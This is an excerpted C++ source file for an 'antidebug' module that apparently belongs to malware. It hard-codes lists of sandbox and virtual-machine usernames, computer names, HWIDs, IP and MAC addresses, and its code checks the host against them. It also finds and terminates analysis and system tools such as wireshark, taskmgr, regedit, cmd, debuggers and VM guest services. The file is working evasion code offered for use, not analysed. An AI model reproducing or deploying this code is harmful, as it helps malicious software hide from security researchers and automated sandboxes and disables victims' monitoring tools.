...
void CheckUser();
/// <summary>
/// check if the current pc name in blacklist
/// </summary>
void CheckPcNames();
/// <summary>
/// check if the current pc HWID in blacklist
/// </summary>
void CheckHWIDs();
/// <summary>
/// check if the current IP in blacklist
/// </summary>
void CheckIPs();
/// <summary>
/// check if the current pc MAC adress in blacklist
/// </summary>
void CheckMacs();
/// <summary>
/// check if the working processes in blacklist and if true kill them
/// </summary>
void CheckProcesses();
...
namespace global {
	...
	const std::string blackListedUsers[32] = { "WDAGUtilityAccount", "Abby", "hmarc", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", 
		"george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A","lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", 
		"SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg"};

	const std::string blackListedPCNames[47] = { "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB",
		"DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
		"RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O","QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "NETTYPC", "DESKTOP-BUGIO", 
		"DESKTOP-CBGPFEE", "SERVER-PC", "TIQIYLA9TW5M", "DESKTOP-KALVINO", "COMPNAME_4047", "DESKTOP-19OLLTD", "DESKTOP-DE369SE", "EA8C2E2A-D017-4", "AIDANPC", "LUCAS-PC", 
		"MARCI-PC", "ACEPC", "MIKE-PC", "DESKTOP-IAPKN1P", "DESKTOP-NTU7VUO", "LOUISE-PC", "T00917", "test42" };

	const std::string blackListedHWIDS[97] = { "7AB5C494-39F5-4941-9163-47F54D6D5016", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", 
		...
		"FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "921E2042-70D3-F9F1-8CBD-B398A21F89C6"};

	const std::string blackListedIPS[60] = { "88.132.231.71", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222",
		"188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151",
		"195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", "109.74.154.91", 
	...
		"00:1b:21:13:32:20", "3c:ec:ef:44:00:d0", "00:50:56:ae:e5:d5", "00:50:56:97:f6:c8", "52:54:00:ab:de:59", "00:50:56:b3:9e:9e", "00:50:56:a0:39:18", "32:11:4d:d0:4a:9e",
		"00:50:56:b3:d0:a7", "94:de:80:de:1a:35", "00:50:56:ae:5d:ea", "00:50:56:b3:14:59", "ea:02:75:3c:90:9f", "00:e0:4c:44:76:54", "ac:1f:6b:d0:4d:e4", "52:54:00:3b:78:24",
		"00:50:56:b3:50:de", "7e:05:a3:62:9c:4d", "52:54:00:b3:e4:71", "90:48:9a:9d:d5:24", "00:50:56:b3:3b:a6", "92:4c:a8:23:fc:2e", "5a:e2:a6:a4:44:db", "00:50:56:ae:6f:54",
		"42:01:0a:96:00:33", "00:50:56:97:a1:f8", "5e:86:e4:3d:0d:f6", "00:50:56:b3:ea:ee", "3e:53:81:b7:01:13", "00:50:56:97:ec:f2", "00:e0:4c:b3:5a:2a", "12:f8:87:ab:13:ec",
		"00:50:56:a0:38:06", "2e:62:e8:47:14:49", "00:0d:3a:d2:4f:1f", "60:02:92:66:10:79", "", "00:50:56:a0:d7:38", "be:00:e5:c5:0c:e5", "00:50:56:a0:59:10", "00:50:56:a0:06:8d",
		"00:e0:4c:cb:62:08", "4e:81:81:8e:22:4e" };

	const std::vector<std::string> blacklistedProcesses = {"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd",
		"vmwaretray", "ida64", "ollydbg","pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", 
		"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"};
}

void antidebug::AntiDebug()
{
	if (!global::debuging)
		CheckUser();
	if (!global::debuging)
...
void CheckPcNames()
{
	TCHAR string[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetComputerName((TCHAR*)string, &size);
	std::wstring ws(string);
	std::string pcName(ws.begin(), ws.end());
	std::cout << pcName << std::endl;

	for (size_t i = 0; i < std::size(global::blackListedPCNames); i++)
	{
		if (global::blackListedPCNames[i] == pcName)
		{
			global::debuging = true;
			break;
		}
...
void CheckHWIDs() 
{
	...
	for (size_t i = 0; i < std::size(global::blackListedHWIDS); i++)
	{
		if (global::blackListedHWIDS[i] == HWID)
		{
			global::debuging = true;
			break;
		}
...
void CheckMacs() 
{
	...
	for (size_t i = 0; i < std::size(global::blackListedMacs); i++)
	{
		if (global::blackListedMacs[i] == mac)
		{
			global::debuging = true;
			break;
		}
...
bool isProcessInBlacklist(const std::string& processName, const std::vector<std::string>& blacklistedProcesses) {
	auto it = std::find(blacklistedProcesses.begin(), blacklistedProcesses.end(), processName);
	return (it != blacklistedProcesses.end());
}
...
void CheckProcesses() 
{
	...
	do {
		...
		processName = processName.substr(0, std::size(processName) - 4);
		processName = toLowercase(processName);
		// Check if the process name is in the blacklist
		if (isProcessInBlacklist(processName, global::blacklistedProcesses)) {
			// Process name is blacklisted, so terminate the process
